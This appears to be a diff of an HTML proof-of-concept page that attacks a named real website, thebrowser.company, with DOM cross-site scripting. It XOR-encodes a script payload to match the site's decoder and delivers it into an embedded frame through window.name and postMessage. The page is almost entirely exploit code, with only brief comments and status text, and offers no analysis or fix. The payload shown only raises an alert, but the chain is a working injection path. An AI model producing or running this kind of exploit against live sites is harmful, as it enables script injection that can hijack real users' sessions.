@@ -1,46 +1,46 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>💥 TheBrowser XSS Chain Exploit</title>
   <meta charset="utf-8">
+  <title>💥 PoC: thebrowser.company DOM XSS</title>
   <style>
-    body { font-family: monospace; background: #111; color: #0f0; padding: 1em; }
-    iframe { width: 100%; height: 600px; border: 2px solid #0f0; margin-top: 1em; }
+    body { background-color: #111; color: #0f0; font-family: monospace; padding: 1rem; }
+    iframe { width: 100%; height: 600px; border: 2px solid lime; margin-top: 1rem; }
   </style>
 </head>
 <body>
 
-<h2>✅ PoC: DOM XSS via window.name + postMessage</h2>
-<div id="status">🔄 Waiting for iframe to load...</div>
+<h2>✅ DOM XSS PoC for thebrowser.company</h2>
+<p>🧠 Payload sent via <code>window.name</code> + <code>postMessage</code></p>
+<div id="log">📡 Waiting for iframe to load...</div>
 
 <iframe id="target" src="https://thebrowser.company/" sandbox="allow-scripts allow-same-origin"></iframe>
 
 <script>
-  const payload = '<script>alert(document.domain)</script>';
-
-  // XOR encoding function based on site's decoder
+  // Simple XOR encoder to match site's decryption logic
   function xorEncode(str, key = 0x66) {
-    const hex = str.split('').map(c => {
-      const code = c.charCodeAt(0) ^ key;
-      return code.toString(16).padStart(2, '0');
-    });
-    return key.toString(16).padStart(2, '0') + hex.join('');
+    const keyHex = key.toString(16).padStart(2, '0');
+    const encoded = Array.from(str).map(c => {
+      return (c.charCodeAt(0) ^ key).toString(16).padStart(2, '0');
+    }).join('');
+    return keyHex + encoded;
   }
 
-  const encoded = xorEncode(payload);
+  const payload = "<script>alert('XSS')</script>";
+  const encodedPayload = xorEncode(payload);
 
-  // Set window.name
   const iframe = document.getElementById("target");
+
   iframe.onload = () => {
-    document.getElementById("status").textContent = "✅ iframe loaded";
+    document.getElementById("log").innerText = "✅ iframe loaded";
 
-    // Send encoded payload via window.name
-    iframe.contentWindow.name = encoded;
+    // Set window.name
+    iframe.contentWindow.name = encodedPayload;
 
-    // Also send via postMessage
+    // Send via postMessage as well
     setTimeout(() => {
-      iframe.contentWindow.postMessage(encoded, "*");
-      console.log("🚀 Payload sent via postMessage + window.name");
+      iframe.contentWindow.postMessage(encodedPayload, "*");
+      console.log("🚀 XSS payload sent via postMessage + window.name");
     }, 1000);
   };
 </script>
